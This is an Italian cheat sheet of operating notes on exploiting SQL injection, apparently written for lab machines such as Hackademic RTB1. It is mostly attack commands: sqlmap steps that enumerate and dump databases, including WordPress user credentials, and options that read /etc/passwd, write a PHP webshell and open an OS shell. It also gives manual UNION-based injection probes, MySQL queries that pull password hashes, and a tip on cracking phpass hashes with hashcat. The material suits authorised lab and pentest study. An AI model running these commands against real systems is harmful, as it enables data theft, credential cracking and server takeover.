# SQL Injection & sqlmap — Note operative

Guida sintetica per identificare e sfruttare SQL Injection, enumerare database ed estrarre credenziali/dati con **sqlmap** e client **MySQL** manuale.

---

## 1. Workflow sqlmap (il percorso standard)

Il flusso tipico è sempre lo stesso, a scendere di livello:
**Database → Tabelle → Colonne/Dump**

```bash
# 1. Verifica vulnerabilità + elenca i database disponibili
sqlmap -u "http://<IP_TARGET>/pagina.php?param=1" --dbs --batch

# 2. Elenca le tabelle di un database specifico
sqlmap -u "http://<IP_TARGET>/pagina.php?param=1" -D <NOME_DB> --tables --batch

# 3. Dump di una tabella specifica (es. utenti WordPress)
sqlmap -u "http://<IP_TARGET>/pagina.php?param=1" -D <NOME_DB> -T <TABELLA> --dump --batch

# 4. (Opzionale) Dump di colonne specifiche
sqlmap -u "http://<IP_TARGET>/pagina.php?param=1" -D <NOME_DB> -T <TABELLA> -C user_login,user_pass --dump --batch
```

### Esempio reale (Hackademic RTB1 / WordPress)

```bash
sqlmap -u "http://192.168.226.130/Hackademic_RTB1/?cat=1" --dbs --batch
sqlmap -u "http://192.168.226.130/Hackademic_RTB1/?cat=1" -D wordpress --tables --batch
sqlmap -u "http://192.168.226.130/Hackademic_RTB1/?cat=1" -D wordpress -T wp_users --dump --batch
```

> **Nota**: `--batch` risponde automaticamente di default a tutte le domande interattive → niente pause. Le tabelle da cercare per prime in un CMS: `wp_users` (WordPress), `users` / `accounts` (generico).

---

## 2. Opzioni sqlmap essenziali

| Opzione | Scopo |
|---|---|
| `-u "URL"` | URL target **con il parametro** da testare |
| `--dbs` | Enumera i database |
| `--tables` | Enumera le tabelle (richiede `-D`) |
| `--columns` | Enumera le colonne (richiede `-D` e `-T`) |
| `--dump` | Scarica il contenuto della tabella |
| `--dump-all` | Scarica **tutto** il DB (lento, rumoroso) |
| `-D` / `-T` / `-C` | Seleziona database / tabella / colonne |
| `--batch` | Modalità non interattiva (default a tutto) |
| `-p <param>` | Forza il test solo su un parametro specifico |
| `--data "user=a&pass=b"` | Testa parametri in **POST** |
| `-r req.txt` | Carica una richiesta HTTP grezza salvata (es. da Burp) |
| `--cookie="PHPSESSID=..."` | Per pagine dietro login |
| `--level=5 --risk=3` | Test più profondi e aggressivi (default: 1/1) |
| `--dbms=mysql` | Salta il fingerprint se conosci già il DBMS |
| `--threads=5` | Accelera (max 10) |
| `--technique=BEUSTQ` | Tecniche: **B**oolean, **E**rror, **U**nion, **S**tacked, **T**ime, inline **Q**uery |
| `--random-agent` | User-Agent casuale (evita ban banali) |
| `--proxy=http://127.0.0.1:8080` | Passa per Burp Suite |

### Opzioni avanzate utili

```bash
# Shell interattiva SQL sul DBMS
sqlmap -u "..." --sql-shell

# Prompt per query diretta singola
sqlmap -u "..." --sql-query "SELECT user(), version()"

# Lettura file dal server (es. /etc/passwd) — richiede privilegi FILE
sqlmap -u "..." --file-read="/etc/passwd"

# Scrittura file / webshell — richiede privilegi FILE e dir scrivibile
sqlmap -u "..." --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Shell OS diretta (se possibile)
sqlmap -u "..." --os-shell
```

---

## 3. Client MySQL manuale

Se hai credenziali valide o una `--sql-shell`:

```bash
# Connessione al DB (locale o remoto)
mysql -u root -p
mysql -u <user> -p -h <IP_TARGET>
```

### Query base di enumerazione

```sql
SHOW DATABASES;                 -- elenca i database
USE <NOME_DB>;                  -- seleziona il database
SHOW TABLES;                    -- elenca le tabelle
SELECT * FROM <TABELLA>;        -- dump della tabella
DESCRIBE <TABELLA>;             -- struttura/colonne della tabella
```

### Query utili in fase di exploitation

```sql
SELECT user(), version(), @@datadir;         -- utente corrente, versione, datadir
SELECT user, password FROM mysql.user;       -- hash utenti MySQL (richiede privilegi)
SELECT user_login, user_pass FROM wp_users;  -- credenziali WordPress
SELECT LOAD_FILE('/etc/passwd');             -- lettura file (privilegio FILE)
```

---

## 4. Riconoscimento manuale (prima di sqlmap)

Test rapidi sul parametro sospetto:

```
?cat=1'            → errore SQL? probabile injection
?cat=1' -- -       → errore sparisce? conferma
?cat=1 AND 1=1     → pagina normale
?cat=1 AND 1=2     → pagina vuota/diversa → boolean-based
?cat=-1 UNION SELECT 1,2,3,4 -- -   → scopri colonne stampate a video
```

> I risultati di sqlmap vengono salvati in `~/.local/share/sqlmap/output/<IP_TARGET>/` — utile per recuperare sessioni precedenti con `--flush-session` per ripartire da zero.

---

## 5. Tips operativi

* **WordPress**: gli hash in `wp_users.user_pass` sono phpass (`$P$...`) → crackabili con `hashcat -m 400` o John (`--format=phpass`).
* Sempre virgolettare l'URL (`-u "..."`) altrimenti la shell mangia `?` e `&`.
* Se il parametro è in POST o dietro login → usa `-r` con la richiesta catturata da Burp: è il metodo più affidabile.
* `--dump-all` solo se il DB è piccolo: su DB grandi è lentissimo e inonda il target di richieste.
